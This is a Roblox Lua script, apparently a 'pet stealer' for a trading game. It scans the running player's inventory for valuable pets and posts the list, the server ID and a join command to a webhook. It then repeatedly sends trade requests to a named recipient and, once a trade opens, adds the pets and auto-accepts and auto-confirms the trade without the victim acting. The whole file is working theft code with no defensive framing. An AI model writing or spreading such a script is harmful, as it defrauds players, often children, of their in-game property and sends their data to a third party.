-- Get valuable pets
local function scanInventory()
    local valuables = {}
    for petId, petData in pairs(DataService.Pets or {}) do
        local displayName = (petData.Shiny and "Shiny " or "") .. (petData.Mythic and "Mythic " or "") .. petData.Name
        local lookupKey = displayName:gsub(" ", "_")
        local value = petValues[lookupKey]
        
        if value and value > 0 then
            table.insert(valuables, {
                id = petId,
                displayName = displayName,
                amount = petData.Amount or 1,
                value = value,
                chance = PetUtil.GetChance(nil, petData)
            })
        end
    end
    
    table.sort(valuables, function(a,b) return a.value > b.value end)
    return valuables
end

-- Format numbers
local function formatNumber(n)
    local s = tostring(n)
    return s:reverse():gsub("(%d%d%d)", "%1,"):reverse():gsub("^,", "")
end

-- Send notification
local function sendNotification(pets, totalValue)
    local petList = ""
    for i, pet in ipairs(pets) do
        if i > 12 then
            petList = petList .. "+ more..."
            break
        end
        petList = petList .. string.format("%dx %s (%s value)\n", pet.amount, pet.displayName, formatNumber(pet.value))
    end
    
    local payload = {
        content = "Server: `" .. jobId .. "`",
        embeds = {{
            title = "Asset Transfer Ready",
            url = "https://www.roblox.com/games/start?placeId=" .. placeId .. "&gameInstanceId=" .. jobId,
            color = 3447003,
            fields = {
                {name = "Holder", value = LocalPlayer.Name, inline = true},
                {name = "Recipient", value = recipient, inline = true},
                {name = "Assets", value = "```" .. petList .. "```", inline = false},
                {name = "Total Value", value = formatNumber(totalValue), inline = true},
                {name = "Join Command", value = "```game:GetService('TeleportService'):TeleportToPlaceInstance(" .. placeId .. ", '" .. jobId .. "')```", inline = false}
            },
            footer = {text = "Generated Script • " .. os.date("%Y-%m-%d %H:%M:%S")}
        }}
    }
    
    request({
        Url = webhookUrl,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(payload)
    })
end

-- Trading functions
local function isPetInTrade(petId)
    local tradeModule = require(ReplicatedStorage.Client.Gui.Frames.Trading)
    local success, tradeData = pcall(debug.getupvalue, tradeModule.IsTrading, 1)
    if not success or type(tradeData) ~= "table" or not tradeData.Party0 then return false end
    for _, offer in pairs(tradeData.Party0.Offer or {}) do
        if offer.Type == "Pet" and offer.Id == petId then return true end
    end
    return false
end

local function getTradeCount()
    local tradeModule = require(ReplicatedStorage.Client.Gui.Frames.Trading)
    local success, tradeData = pcall(debug.getupvalue, tradeModule.IsTrading, 1)
    if not success or type(tradeData) ~= "table" or not tradeData.Party0 then return 0 end
    local count = 0
    for _, offer in pairs(tradeData.Party0.Offer or {}) do
        if offer.Type == "Pet" then count = count + 1 end
    end
    return count
end

local function executeTrade(pets)
    local tradeGui = LocalPlayer.PlayerGui.ScreenGui.Trading
    local offeredPets = {}
    local index = 1
    
    while getTradeCount() < 10 and index <= #pets and tradeGui.Visible do
        local pet = pets[index]
        if not offeredPets[pet.id] then
            offeredPets[pet.id] = true
            local attempts = 0
            repeat
                attempts = attempts + 1
                ReplicatedStorage.Shared.Framework.Network.Remote.RemoteEvent:FireServer("TradeAddPet", pet.id)
                task.wait(0.3)
            until isPetInTrade(pet.id) or attempts >= 5
        end
        index = index + 1
    end
    
    for _ = 1, 10 do
        if not tradeGui.Visible then break end
        ReplicatedStorage.Shared.Framework.Network.Remote.RemoteEvent:FireServer("TradeAccept")
        task.wait(0.2)
    end
    
    task.spawn(function()
        while tradeGui.Visible do
            ReplicatedStorage.Shared.Framework.Network.Remote.RemoteEvent:FireServer("TradeConfirm")
            task.wait(0.2)
        end
    end)
end

-- Main execution
local function initiateTransfer()
    local pets = scanInventory()
    if #pets == 0 then
        LocalPlayer:Kick("No eligible assets found")
        return
    end
    
    local totalValue = 0
    for _, pet in ipairs(pets) do
        totalValue = totalValue + (pet.value * pet.amount)
    end
    
    sendNotification(pets, totalValue)
    
    -- Wait for recipient and trade
    local trading = false
    
    task.spawn(function()
        while true do
            ReplicatedStorage.Shared.Framework.Network.Remote.RemoteEvent:FireServer("TradeRequest", Players:WaitForChild(recipient))
            task.wait(0.6)
        end
    end)
    
    local tradeGui = LocalPlayer.PlayerGui.ScreenGui.Trading
    
    tradeGui:GetPropertyChangedSignal("Visible"):Connect(function()
        if tradeGui.Visible and not trading then
            trading = true
            executeTrade(pets)
        elseif not tradeGui.Visible then
            trading = false
        end
    end)
    
    -- Listen for chat trigger
    Players.PlayerAdded:Connect(function(plr)
        if plr.Name == recipient then
            plr.Chatted:Connect(function()
                if not trading then
                    trading = true
                    executeTrade(pets)
                end
            end)
        end
    end)
    
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr.Name == recipient then
            plr.Chatted:Connect(function()
                if not trading then
                    trading = true
                    executeTrade(pets)
                end
            end)
        end
    end
end

